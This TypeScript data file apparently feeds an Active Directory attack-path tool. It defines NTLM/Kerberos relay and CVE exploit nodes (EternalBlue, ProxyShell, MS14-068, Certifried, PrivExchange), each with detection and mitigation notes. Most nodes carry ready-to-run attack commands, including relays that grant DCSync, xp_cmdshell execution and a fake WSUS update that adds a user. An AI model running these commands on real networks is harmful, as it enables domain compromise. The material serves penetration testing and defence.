import type { AttackEdge, TechniqueNodeDef } from '../schema';
import { mitre, r } from '../lib';

/**
 * Web-verified additions (June 2026):
 *   - NTLM-relay variants hanging off the existing `ntlm-relay` node.
 *   - "Quick-compromise" CVE PoCs hanging off a new `ad-cat-quick-compromise`
 *     category node.
 * Every command/flag/CVE/MITRE mapping below was checked against MITRE ATT&CK,
 * the official tool repos (Impacket, krbrelayx/PrivExchange by dirkjanm,
 * KrbRelayUp, Certipy), thehacker.recipes, HackTricks and Microsoft advisories.
 * Several of these are destructive or CVE PoCs: see each node's `opsec`.
 */
export const ntlmRelayCveNodes: TechniqueNodeDef[] = [
  // ── GROUP 1: NTLM-relay variants (parent = ntlm-relay) ──────────────────
  {
    id: 'relay-drop-mic',
    label: 'Drop-the-MIC (CVE-2019-1040)',
    phase: 'credential-access',
    needs: 'none',
    summary: 'Strip the NTLM MIC to relay cross-protocol (SMB -> LDAP).',
    description:
      'The Message Integrity Code (MIC) exists to stop an attacker from tampering with NTLM messages during a relay. CVE-2019-1040 ("Drop the MIC") showed the target still accepts NTLM auth after the MIC is stripped, so the attacker can clear the signing-negotiation flags too and relay cross-protocol with an unsigned session. ntlmrelayx does this with --remove-mic, which enables unsigned relays such as SMB to LDAP. Relaying a machine or user to LDAP this way grants the attacker-chosen user DCSync rights (it writes the DS-Replication-Get-Changes and -All ACEs on the domain object) or configures delegation, provided the relayed account already holds sufficient rights, e.g. WriteDacl on the domain (Exchange) or a DC computer account.',
    tools: [
      { name: 'ntlmrelayx (Impacket)', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      {
        label: 'Relay SMB to LDAP with the MIC stripped, escalate a user',
        code: r`ntlmrelayx.py -t ldap://dc01 --remove-mic --escalate-user lowpriv -smb2support`,
        lang: 'bash',
      },
      {
        label: 'Relay to LDAPS with an interactive LDAP shell',
        code: r`ntlmrelayx.py -t ldaps://dc01 --remove-mic -i -smb2support`,
        lang: 'bash',
      },
    ],
    requires: [
      'Captured/coerced NTLM authentication to relay',
      'The target that accepts the relayed auth must be unpatched for CVE-2019-1040 (patched June-2019); for SMB -> LDAP that target is the DC',
      'LDAP signing / channel binding NOT enforced on the target',
    ],
    mitre: mitre('T1557.001'),
    references: [
      { label: 'dirkjanm, Exploiting CVE-2019-1040', url: 'https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/' },
      { label: 'The Hacker Recipes, NTLM relay', url: 'https://www.thehacker.recipes/ad/movement/ntlm/relay' },
    ],
    opsec: 'CVE PoC: only works when the host that accepts the relayed auth is unpatched for CVE-2019-1040 (here the DC accepting the SMB -> LDAP relay), and the LDAP-side ACL/escalation change (DCSync grant, 5136 directory-modification) is high-signal and persistent. Enforcing LDAP signing + channel binding mitigates the relay entirely.',
  },
  {
    id: 'relay-to-mssql',
    label: 'Relay to MSSQL',
    phase: 'credential-access',
    needs: 'none',
    summary: 'Relay auth to a SQL Server, run OS commands via xp_cmdshell as the SQL Server service account.',
    description:
      'Instead of relaying to SMB/LDAP, point ntlmrelayx at a MSSQL instance with -t mssql://. The relayed identity is authenticated to the database; if that login is sysadmin (or can enable it) you can turn on and run xp_cmdshell to execute OS commands as the SQL Server service account. ntlmrelayx exposes an interactive MSSQL prompt with -i (a SOCKS proxy via -socks is the multi-target alternative).',
    tools: [
      { name: 'ntlmrelayx (Impacket)', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      {
        label: 'Relay to MSSQL, open an interactive SQL shell',
        code: r`ntlmrelayx.py -t mssql://10.0.0.30 -i -smb2support --no-multirelay`,
        lang: 'bash',
      },
      {
        label: 'In the relayed SQL prompt: enable + run xp_cmdshell',
        code: r`enable_xp_cmdshell` + '\n' + r`xp_cmdshell whoami`,
        lang: 'sql',
      },
    ],
    requires: [
      'Captured/coerced authentication of a SQL login',
      'A reachable MSSQL instance where the relayed login is (or can become) sysadmin',
    ],
    mitre: mitre('T1557.001'),
    references: [
      { label: 'HackTricks, Pentesting MSSQL', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html' },
      { label: 'Compass Security, Relaying NTLM to MSSQL', url: 'https://blog.compass-security.com/2023/10/relaying-ntlm-to-mssql/' },
    ],
    opsec: 'xp_cmdshell execution and the sp_configure change are logged by SQL Server audit/EDR and the spawned cmd runs as the SQL service account. Disabling xp_cmdshell and enforcing Extended Protection on SQL endpoints closes this path.',
  },
  {
    id: 'relay-to-wsus',
    label: 'Relay / Abuse WSUS',
    phase: 'credential-access',
    needs: 'none',
    summary: 'Relay WSUS client auth, or push a malicious update.',
    description:
      'WSUS clients authenticate to the update server, so an attacker who spoofs or relays WSUS (commonly over the cleartext HTTP port 8530) can capture and relay machine and user authentications to SMB, LDAP/S or AD CS (ESC8). The second angle is update injection: when WSUS runs over HTTP, a MITM can push an attacker-chosen Microsoft-signed binary (e.g. PsExec) as a "patch", running it as SYSTEM on the client. The relay and the update injection are separate attacks with different tooling.',
    tools: [
      { name: 'ntlmrelayx (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'PyWSUS', url: 'https://github.com/GoSecure/pywsus' },
      { name: 'wsuks', url: 'https://github.com/NeffIsBack/wsuks' },
    ],
    commands: [
      {
        label: 'Relay WSUS machine-account auth to LDAP (RBCD)',
        code: r`ntlmrelayx.py -t ldap://dc01 -smb2support --http-port 8530 --remove-mic --delegate-access`,
        lang: 'bash',
      },
      {
        label: 'Inject a malicious "update" via a rogue HTTP WSUS server',
        code: r`python pywsus.py -H <attacker_ip> -p 8530 -e PsExec64.exe -c '/accepteula /s cmd.exe /c "net user hacker Passw0rd! /add"'`,
        lang: 'bash',
      },
    ],
    requires: [
      'A position to intercept/relay WSUS traffic (LLMNR/ARP/mitm6 poisoning or rogue server)',
      'WSUS configured over HTTP (no TLS) for the update-injection variant',
    ],
    mitre: mitre('T1557'),
    references: [
      { label: 'TrustedSec, WSUS Is SUS: NTLM Relay Attacks', url: 'https://trustedsec.com/blog/wsus-is-sus-ntlm-relay-attacks-in-plain-sight' },
      { label: 'GoSecure, Abusing WSUS to enable NTLM relaying', url: 'https://web.archive.org/web/20240228190251/https://gosecure.ai/blog/2021/11/22/gosecure-investigates-abusing-windows-server-update-services-wsus-to-enable-ntlm-relaying-attacks/' },
    ],
    opsec: 'Destructive/disruptive: serving a fake update deploys a binary to clients as SYSTEM and shows up as an out-of-band patch in WSUS reporting; the MITM/poisoning leg is itself noisy. Configuring WSUS over HTTPS with TLS mitigates the update-injection variant. (PyWSUS command is illustrative: confirm flags against the tool README for your version.)',
  },
  {
    id: 'kerberos-relay',
    label: 'Kerberos Relay',
    phase: 'credential-access',
    needs: 'none',
    summary: 'Relay a Kerberos AP-REQ (e.g. to LDAP) for RBCD.',
    description:
      'Kerberos auth can also be relayed: an AP-REQ a victim initiates for one service is forwarded to another service that does not enforce signing or encryption. dirkjanm\'s krbrelayx (paired with mitm6 to coerce auth via DNS) relays the ticket to HTTP or LDAP. KrbRelayUp packages a local self-relay on Windows where LDAP signing is not enforced (the default): it coerces the local machine account, relays to LDAP, and configures RBCD over the host to gain SYSTEM. On a default DC, LDAP signing is off so the LDAP relay works, which is KrbRelayUp\'s premise; once LDAP signing and channel binding are enforced the LDAP relay is blocked and AD CS HTTP web enrollment (ESC8) becomes the common alternative target.',
    tools: [
      { name: 'krbrelayx (dirkjanm)', url: 'https://github.com/dirkjanm/krbrelayx' },
      { name: 'KrbRelayUp', url: 'https://github.com/Dec0ne/KrbRelayUp' },
      { name: 'mitm6', url: 'https://github.com/dirkjanm/mitm6' },
    ],
    commands: [
      {
        label: 'krbrelayx: relay a coerced Kerberos AP-REQ to AD CS over HTTP',
        code: r`krbrelayx.py --target http://adcs.domain.local/certsrv/ -ip <attacker_ip> --victim TARGET$ --adcs --template Machine`,
        lang: 'bash',
      },
      {
        label: 'KrbRelayUp: RBCD local privesc (relay then spawn)',
        code: r`KrbRelayUp.exe relay -d domain.local -cn FAKECOMPUTER -m rbcd -c -cp Passw0rd!` + '\n' + r`KrbRelayUp.exe spawn -d domain.local -cn FAKECOMPUTER -m rbcd -cp Passw0rd! -i Administrator`,
        lang: 'powershell',
      },
    ],
    requires: [
      'Ability to coerce/trigger Kerberos auth from the victim (mitm6/DNS, local COM)',
      'A target service not enforcing Kerberos signing/encryption (HTTP AD CS, or LDAP without signing)',
      'MachineAccountQuota > 0 (to create the RBCD computer object)',
    ],
    mitre: mitre('T1557'),
    references: [
      { label: 'HackTricks, LDAP Signing & Channel Binding (Kerberos relay)', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ldap-signing-and-channel-binding.html' },
      { label: 'The Hacker Recipes, Kerberos relay', url: 'https://www.thehacker.recipes/ad/movement/kerberos/relay' },
      { label: 'dirkjanm, Relaying Kerberos over DNS with krbrelayx & mitm6', url: 'https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/' },
      { label: 'Microsoft, Detecting KrbRelayUp', url: 'https://www.microsoft.com/en-us/security/blog/2022/05/25/detecting-and-preventing-privilege-escalation-attacks-leveraging-kerberos-relaying-krbrelayup/' },
    ],
    opsec: 'Creating/renaming a machine account (4741/4781) and the RBCD attribute write (5136 on msDS-AllowedToActOnBehalfOfOtherIdentity) are detectable; mitm6/DNS poisoning is noisy. Enforcing LDAP signing + channel binding and setting MachineAccountQuota to 0 break the chain. Operationally: krbrelayx needs a krb5.conf for the realm and the target reachable by FQDN (add it to /etc/hosts) so the relayed AP-REQ validates against the right SPN.',
  },
  {
    id: 'relay-to-ldap',
    aliases: ['CoerceAndRelayNTLMToLDAP', 'CoerceAndRelayNTLMToLDAPS'],
    label: 'Relay to LDAP(S)',
    phase: 'lateral-movement',
    needs: 'none',
    summary: 'Relay the captured NTLM auth to a DC over LDAP(S) for a directory write.',
    description: r`Relay the coerced/poisoned NTLM authentication to LDAP or LDAPS on a Domain Controller. LDAP signing is not required by default (LDAPServerIntegrity is negotiate), but a relayed session cannot sign, so plain-LDAP relays fail once signing is negotiated. LDAPS is targeted to avoid signing, and StartTLS on 389 can bypass channel binding when signing is not enforced. The relayed session acts as the victim in the directory, so ntlmrelayx can perform a write attack: configure Resource-Based Constrained Delegation on a computer object (auto-creating an attacker-controlled computer with --delegate-access) or add Shadow Credentials (--shadow-credentials) to a principal. A relayed machine account is ideal for RBCD/Shadow Credentials because it can write over its own object. Granting DCSync (DS-Replication) is different: it edits the domain object\'s DACL, so it needs a relayed identity that already holds WriteDacl on the domain head (e.g. an Exchange server or a privileged account), not a plain machine account.`,
    tools: [
      { name: 'Impacket ntlmrelayx', url: 'https://github.com/fortra/impacket' },
      { name: 'krbrelayx', url: 'https://github.com/dirkjanm/krbrelayx' },
    ],
    commands: [
      { label: 'Relay to LDAPS -> configure RBCD', code: r`ntlmrelayx.py -t ldaps://dc01.corp.local --delegate-access -smb2support`, lang: 'bash' },
      { label: 'Relay to LDAPS -> Shadow Credentials', code: r`ntlmrelayx.py -t ldaps://dc01.corp.local --shadow-credentials -smb2support`, lang: 'bash' },
    ],
    mitre: mitre('T1557.001'),
    references: [
      { label: 'HackTricks, LDAP Signing & Channel Binding', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ldap-signing-and-channel-binding.html' },{ label: 'The Hacker Recipes, NTLM relay', url: 'https://www.thehacker.recipes/ad/movement/ntlm/relay' }],
    requires: ['Captured/coerced NTLM auth (a machine account is ideal)', 'LDAP signing / channel binding NOT enforced on the DC'],
    opsec: 'Writing msDS-AllowedToActOnBehalfOfOtherIdentity or msDS-KeyCredentialLink is an auditable directory change (5136); --delegate-access also creates a computer account (4741). Enforcing LDAP signing + channel binding breaks this. Clean up the attribute afterwards.',
  },

  // ── GROUP 2: quick-compromise CVEs (parent = ad-cat-quick-compromise) ────
  {
    id: 'ad-cat-quick-compromise',
    label: 'Quick Compromise',
    phase: 'initial-access',
    kind: 'category',
    summary: 'Pre-auth, high-impact exploits: unauthenticated RCE to SYSTEM (EternalBlue, ProxyLogon/ProxyShell, SMBGhost) or an auth-bypass to Domain Admin (ZeroLogon).',
    description:
      'Pre-auth, high-impact exploits against exposed services that can hand you SYSTEM on a host or Domain Admin outright when a target is unpatched: EternalBlue, the Exchange ProxyLogon/ProxyShell chains, SMBGhost, and ZeroLogon against a DC.',
  },
  {
    id: 'eternalblue',
    label: 'EternalBlue (MS17-010)',
    phase: 'initial-access',
    needs: 'none',
    summary: 'SMBv1 buffer overflow -> remote code execution as SYSTEM.',
    description:
      'MS17-010 (CVE-2017-0143/0144/...) is a set of flaws in the SMBv1 server where specially crafted packets cause a pool buffer overflow, allowing unauthenticated remote code execution. The NSA-developed exploit (leaked by the Shadow Brokers and used by WannaCry) yields SYSTEM on an unpatched, SMBv1-enabled host. Scan first, then exploit.',
    tools: [
      { name: 'Metasploit (ms17_010_eternalblue)', url: 'https://github.com/rapid7/metasploit-framework' },
      { name: 'AutoBlue-MS17-010', url: 'https://github.com/3ndG4me/AutoBlue-MS17-010' },
    ],
    commands: [
      {
        label: 'Check vulnerability (NetExec)',
        code: r`nxc smb 10.0.0.0/24 -M ms17-010`,
        lang: 'bash',
      },
      {
        label: 'Exploit with Metasploit',
        code: r`msf6 > use exploit/windows/smb/ms17_010_eternalblue` + '\n' + r`msf6 > set RHOSTS 10.0.0.20; run`,
        lang: 'bash',
      },
    ],
    requires: [
      'A reachable host with SMBv1 enabled (445/tcp)',
      'MS17-010 cumulative update not applied (and SMBv1 still enabled)',
    ],
    versions: ['win7', 'win8', 'win10-1507', 'win10-1607', 'srv2008', 'srv2012', 'srv2016'],
    affects: 'SMBv1 hosts unpatched for MS17-010: Windows 7/8.1, Windows 10 1507/1607, and Server 2008/R2, 2012/R2, 2016.',
    mitre: mitre('T1210'),
    references: [
      { label: 'Microsoft, MS17-010 bulletin', url: 'https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010' },
      { label: 'CVE-2017-0144 (NVD)', url: 'https://nvd.nist.gov/vuln/detail/cve-2017-0144' },
    ],
    opsec: 'Memory-corruption PoC: can BSOD/crash the target if the kernel grooming fails, a real risk on production hosts. SMBv1 exploit traffic and the resulting SYSTEM-level process are detectable; disabling SMBv1 and patching fully mitigate.',
  },
  {
    id: 'proxyshell',
    label: 'ProxyShell (Exchange)',
    phase: 'initial-access',
    needs: 'none',
    summary: 'Exchange path-confusion + backend privesc + file-write chain -> webshell/RCE.',
    description:
      'ProxyShell chains three on-prem Exchange CVEs: CVE-2021-34473 (pre-auth path confusion / ACL bypass in Explicit Logon URL normalization, reaching an arbitrary backend URL as the Exchange machine account), CVE-2021-34523 (PowerShell backend privilege escalation via X-Rps-CAT), and CVE-2021-31207 (arbitrary file write via New-MailboxExportRequest). Combined, an unauthenticated attacker exports a mailbox containing an ASPX webshell into a web-accessible directory, then triggers it for RCE as SYSTEM/Exchange. From SYSTEM the Exchange machine account\'s domain rights (pre-Feb-2019 Exchange Windows Permissions still holding WriteDacl on the domain) let you grant yourself DCSync, or you dump domain credentials on the host, pivoting to Domain Admin.',
    tools: [
      { name: 'Metasploit (exchange_proxyshell_rce)', url: 'https://github.com/rapid7/metasploit-framework' },
    ],
    commands: [
      {
        label: 'Exploit the full chain with Metasploit',
        code: r`msf6 > use exploit/windows/http/exchange_proxyshell_rce` + '\n' + r`msf6 > set RHOSTS mail.corp.local; set EMAIL admin@corp.local; run`,
        lang: 'bash',
      },
    ],
    requires: [
      'A reachable on-prem Exchange server (Autodiscover/OWA exposed)',
      'Exchange unpatched (2013 <= CU23, 2016 <= CU20, 2019 <= CU9; pre KB5001779 + May-2021)',
    ],
    mitre: mitre('T1190'),
    references: [
      { label: 'Mandiant, PST, Want a Shell? (ProxyShell)', url: 'https://cloud.google.com/blog/topics/threat-intelligence/pst-want-shell-proxyshell-exploiting-microsoft-exchange-servers' },
      { label: 'Orange Tsai, ProxyShell (A New Attack Surface on MS Exchange, Part 3)', url: 'https://blog.orange.tw/posts/2021-08-proxyshell-a-new-attack-surface-on-ms-exchange-part-3/' },
      { label: 'Qualys, ProxyShell CVE-2021-34473/34523/31207', url: 'https://threatprotect.qualys.com/2021/08/10/proxyshell-a-new-attack-surface-on-microsoft-exchange-server-cve-2021-34473-cve-2021-34523-cve-2021-31207/' },
    ],
    opsec: 'Drops an ASPX webshell on disk (a durable, easily-hunted artifact in Exchange web dirs) and leaves IIS/Exchange request logs of the path-confusion requests and New-MailboxExportRequest. Patch Exchange and monitor for unexpected mailbox export requests.',
  },
  {
    id: 'ms14-068',
    label: 'MS14-068 (CVE-2014-6324)',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'Forge a PAC with elevated group SIDs via the checksum flaw.',
    description:
      'Pre-patch, the KDC validated the PAC signature with KdcVerifyPacSignature accepting any signature <= 20 bytes, so a non-keyed hash (MD5) was accepted as valid. A low-priv user can therefore forge a PAC claiming membership in Domain Admins and have the KDC issue a TGT honoring it. Unlike a Golden Ticket it does not need the krbtgt hash: only a domain account name, its password/hash, and its SID.',
    tools: [
      { name: 'goldenPac (Impacket)', url: 'https://github.com/fortra/impacket/blob/master/examples/goldenPac.py' },
      { name: 'pykek (ms14-068.py)', url: 'https://github.com/mubix/pykek' },
    ],
    commands: [
      {
        label: 'Automated: forge PAC, then PsExec into the @host target (add -dc-ip/-target-ip if names do not resolve)',
        code: r`goldenPac.py domain.local/user:'Passw0rd!'@dc01.domain.local -dc-ip <dc_ip> -target-ip <dc_ip>`,
        lang: 'bash',
      },
      {
        label: 'pykek: generate a forged TGT (ccache)',
        code: r`ms14-068.py -u user@domain.local -p Passw0rd! -s S-1-5-21-...-1106 -d dc01.domain.local`,
        lang: 'bash',
      },
    ],
    requires: [
      'Any valid domain account (name + password/hash); the user SID is supplied manually only for the pykek path, goldenPac resolves it automatically',
      'A DC unpatched for MS14-068 (pre Nov-2014)',
    ],
    versions: ['srv2008', 'srv2012'],
    affects: 'Domain Controllers running Server 2003, 2008/R2, or 2012/R2 unpatched for MS14-068 (the KDC PAC-validation flaw predates Server 2016).',
    mitre: mitre('T1068'),
    references: [
      { label: 'Microsoft, MS14-068 bulletin', url: 'https://learn.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-068' },
      { label: 'The Hacker Recipes, MS14-068', url: 'https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/ms14-068' },
    ],
    opsec: 'CVE PoC, only against DCs unpatched since 2014 (rare today). The forged-PAC TGT and the privileged logon it enables are anomalous (4768/4769 with mismatched group membership). No mitigation needed beyond the long-available patch.',
  },
  {
    id: 'certifried',
    label: 'Certifried (CVE-2022-26923)',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'Spoof a machine certificate to impersonate a DC.',
    description:
      'AD CS embeds the requesting machine\'s dNSHostName in the issued certificate, and pre-patch that attribute did not need to be unique. A low-priv user with MachineAccountQuota can create a computer account, set its dNSHostName to a Domain Controller\'s, and request a Machine-template certificate, which then authenticates as the DC. PKINIT auth with that cert returns the DC\'s NT hash, enabling DCSync and full domain takeover.',
    tools: [
      { name: 'Certipy', url: 'https://github.com/ly4k/Certipy' },
    ],
    commands: [
      {
        label: 'Create a computer account spoofing the DC dNSHostName',
        code: r`certipy account create -u user@domain.local -p 'Passw0rd!' -user EVILPC -pass 'Passw0rd!' -dns dc01.domain.local`,
        lang: 'bash',
      },
      {
        label: 'Request a Machine cert, then auth to recover the DC NT hash',
        code: r`certipy req -u 'EVILPC$@domain.local' -p 'Passw0rd!' -dc-ip 10.0.0.1 -target ca01.domain.local -ca CORP-CA -template Machine` + '\n' + r`certipy auth -pfx dc01.pfx -dc-ip 10.0.0.1`,
        lang: 'bash',
      },
    ],
    requires: [
      'Any valid domain account with MachineAccountQuota > 0',
      'AD CS with an enabled machine-enrollment template (e.g. Machine)',
      'DC unpatched for CVE-2022-26923 (pre May-2022)',
    ],
    versions: ['srv2012', 'srv2016', 'srv2019', 'srv2022'],
    affects: 'AD CS / Domain Controllers on Server 2012/R2 through 2022 unpatched for CVE-2022-26923 (pre KB5014754, May 2022).',
    mitre: mitre('T1068'),
    references: [
      { label: 'Oliver Lyak (IFCR), Certifried CVE-2022-26923', url: 'https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4' },
    ],
    opsec: 'Machine-account creation (4741) and a certificate request whose dNSHostName collides with a DC are detectable in AD CS / directory logs. The May-2022 patch (KB5014754) closes the spoof mainly by preventing a dNSHostName from colliding with an existing account, and additionally embeds the requester SID in the certificate (szOID_NTDS_CA_SECURITY_EXT); strong SID binding on the KDC was only enforced by default from Feb 2025.',
  },
  {
    id: 'privexchange',
    label: 'PrivExchange (CVE-2019-0686 / CVE-2019-0724)',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'Coerce Exchange to auth -> relay to LDAP for DCSync.',
    description:
      'The Exchange EWS PushSubscription API can be abused to make the Exchange server authenticate (over HTTP) to an attacker-controlled host, addressed by the Feb-2019 Exchange elevation-of-privilege fix (CVE-2019-0686 / CVE-2019-0724). Because Exchange (via the Exchange Windows Permissions group) holds WriteDacl on the domain object by default, relaying that high-privileged machine authentication to LDAP lets the attacker grant a controlled user DCSync rights, escalating any mailbox-holding user toward Domain Admin.',
    tools: [
      { name: 'PrivExchange (dirkjanm)', url: 'https://github.com/dirkjanm/PrivExchange' },
      { name: 'ntlmrelayx (Impacket)', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      {
        label: 'Step 1: start the relay listener (grants DCSync to lowpriv)',
        code: r`ntlmrelayx.py -t ldap://dc01 --escalate-user lowpriv`,
        lang: 'bash',
      },
      {
        label: 'Step 2: trigger the coerced Exchange auth at the listener',
        code: r`python privexchange.py -ah <attacker_ip> exchange.domain.local -u mailboxuser -d domain.local -p 'Passw0rd!'`,
        lang: 'bash',
      },
    ],
    requires: [
      'Any account with a mailbox on the target Exchange server',
      'Exchange holding default WriteDacl on the domain (pre Feb-2019 hardening)',
      'LDAP signing not enforced (relay target)',
    ],
    mitre: mitre('T1068'),
    references: [
      { label: 'dirkjanm, Abusing Exchange: One API call away from Domain Admin', url: 'https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/' },
      { label: 'The Hacker Recipes, PushSubscription abuse (PrivExchange)', url: 'https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/pushsubscription-abuse' },
      { label: 'CVE-2019-0724 (NVD), DC-relay -> Domain Admin variant', url: 'https://nvd.nist.gov/vuln/detail/CVE-2019-0724' },
    ],
    opsec: 'The coerced Exchange auth and the resulting DCSync ACL grant (5136 directory modification) are high-signal. Microsoft\'s Feb-2019 update removed Exchange\'s domain WriteDacl; enforcing LDAP signing/channel binding also blocks the relay.',
  },
];

export const ntlmRelayCveEdges: AttackEdge[] = [
  // GROUP 1: parent ntlm-relay -> signing fork -> variants. ntlm-relay first forks on
  // whether the target enforces signing (nodes in initial-access.ts). The direct SMB/LDAP
  // relays hang off 'relay-unsigned'; the signing-agnostic channels below hang off
  // 'relay-signing-enforced' — they ride HTTP/RPC/TDS, not SMB/LDAP, so they work whether
  // or not signing is on and are the answer when it IS. kerberos-relay stays under
  // ntlm-relay: its condition is NTLM being disabled (Protected Users), orthogonal to signing.
  // Drop-the-MIC (CVE-2019-1040) strips the NTLM MIC so an unsigned cross-protocol relay
  // (SMB -> LDAP) still lands. Its precondition is a target where signing is NOT enforced,
  // so it hangs off relay-unsigned; it does NOT defeat enforced LDAP signing / channel binding.
  { source: 'relay-unsigned', target: 'relay-drop-mic', label: 'strip MIC (CVE-2019-1040)' },
  { source: 'relay-signing-enforced', target: 'relay-to-mssql', description: 'Indicators this path applies: TCP 1433 open (or non-default MSSQL port, e.g. 6520); MS SQL Server TDS pre-login banner; Valid domain/SQL/local credential pair recovered for a service or low-priv principal (e.g. svc_mssql, sqlsvc).' },
  { source: 'relay-signing-enforced', target: 'relay-to-wsus' },
  // WSUS relay has two paths: serve a malicious update (→ SYSTEM), OR relay the
  // client auth onward to LDAP like any other relay target.
  { source: 'relay-to-wsus', target: 'local-admin-host', label: 'malicious update -> SYSTEM' },
  { source: 'relay-to-wsus', target: 'relay-to-ldap', label: 'relay client auth' },
  { source: 'ntlm-relay', target: 'kerberos-relay', description: 'Indicators this path applies: NTLM is disabled or blocked (STATUS_NOT_SUPPORTED / STATUS_ACCOUNT_RESTRICTION, target in Protected Users); or the target authorizes Kerberos only and enforces EPA / channel binding on HTTP or AD CS so an NTLM relay is refused. Coerce Kerberos auth via the target SPN and relay the AP-REQ instead.' },
  { source: 'relay-unsigned', target: 'relay-to-ldap', label: 'LDAP signing + CBT off' },
  // Relay captured/coerced NTLM to AD CS enrollment — the canonical ESC8 (HTTP web enrollment)
  // and ESC11 (ICertPassage RPC) relay targets (best with a machine/privileged auth source).
  { source: 'relay-signing-enforced', target: 'adcs-esc8', label: 'relay to AD CS web enrollment' },
  { source: 'relay-signing-enforced', target: 'adcs-esc11', label: 'relay to ICertPassage RPC' },
  { source: 'relay-signing-enforced', target: 'crack-netntlm', label: 'nothing relayable → crack offline' },
  { source: 'relay-to-ldap', target: 'rbcd', label: 'set RBCD attribute' },
  { source: 'relay-to-ldap', target: 'shadow-credentials', label: 'add key credential' },
  { source: 'relay-to-ldap', target: 'dcsync', label: 'grant DS-Replication' },
  // GROUP 1: Drop-the-MIC (CVE-2019-1040) strips the MIC to relay cross-protocol
  // to LDAP; the DCSync grant is then one of relay-to-ldap's outcomes above.
  { source: 'relay-drop-mic', target: 'relay-to-ldap', label: 'drop MIC → cross-protocol' },
  { source: 'kerberos-relay', target: 'adcs-esc8', label: 'relay to web enroll' },
  { source: 'relay-to-mssql', target: 'mssql-linked-servers' },
  { source: 'relay-to-mssql', target: 'user-foothold', label: 'xp_cmdshell as the SQL service account' },
  { source: 'kerberos-relay', target: 'rbcd', label: 'set RBCD attribute' },

  // GROUP 2: Quick Compromise = UNAUTHENTICATED known-vuln exploits, off
  // network-recon (no creds needed). The authenticated CVEs (ms14-068,
  // certifried, privexchange) moved to the 'Critical CVEs' category under
  // Privilege Escalation (see ad-categories.ts).
  { source: 'network-recon', target: 'ad-cat-quick-compromise' },
  { source: 'ad-cat-quick-compromise', target: 'zerologon', description: 'Indicators this path applies: a DC reachable on TCP 135/445 with Netlogon (MS-NRPC) exposed; the DC is unpatched against CVE-2020-1472 (pre-August-2020, enforcement not applied); an all-zero ClientCredential is accepted by NetrServerAuthenticate3.' },
  { source: 'ad-cat-quick-compromise', target: 'eternalblue' },
  { source: 'ad-cat-quick-compromise', target: 'proxyshell' },
  // GROUP 2: downstream into existing nodes
  { source: 'eternalblue', target: 'local-admin-host', label: 'SYSTEM' },
  { source: 'proxyshell', target: 'local-admin-host', label: 'webshell -> RCE' },
  // ProxyShell yields SYSTEM on Exchange (-> local-admin-host). The pre-2019 Exchange
  // Windows Permissions WriteDacl -> DCSync pivot lives in the proxyshell node prose; the
  // coercion-based PrivExchange is modeled separately (cvegrp-exchange -> privexchange).
  { source: 'ms14-068', target: 'domain-admin', label: 'forged PAC' },
  { source: 'certifried', target: 'pass-the-certificate', label: 'DC machine cert' },
  { source: 'privexchange', target: 'dcsync', label: 'DCSync rights' },
];
